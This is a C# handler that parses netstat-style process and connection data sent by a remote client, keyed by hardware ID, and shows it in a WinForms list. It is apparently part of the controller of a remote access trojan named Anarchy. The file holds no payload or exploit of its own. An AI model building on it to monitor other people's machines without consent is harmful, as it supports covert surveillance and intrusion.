using System;
using System.IO;
using System.Windows.Forms;
using Anarchy.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;

namespace Anarchy.Handlers
{
    public class HandleNetstat
    {
        public void GetProcess(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                FormNetstat formNetstat;
                formNetstat = (FormNetstat)Application.OpenForms["Netstat:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                if (formNetstat == null)
                {
                    return;
                }
                if (formNetstat.Client == null)
                {
                    formNetstat.Client = client;
                    formNetstat.listView1.Enabled = true;
                    formNetstat.timer1.Enabled = true;
                }
                formNetstat.listView1.Items.Clear();
                string[] array;
                array = unpack_msgpack.ForcePathObject("Message").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                for (int num = 0; num < array.Length; num = num + 3 + 1)
                {
                    if (array[num].Length > 0)
                    {
                        ListViewItem listViewItem;
                        listViewItem = new ListViewItem
                        {
                            Text = Path.GetFileName(array[num])
                        };
                        listViewItem.SubItems.Add(array[num + 1]);
                        listViewItem.SubItems.Add(array[num + 2]);
                        listViewItem.SubItems.Add(array[num + 3]);
                        listViewItem.ToolTipText = array[num];
                        formNetstat.listView1.Items.Add(listViewItem);
                    }
                }
            }
            catch
            {
            }
        }
    }
}
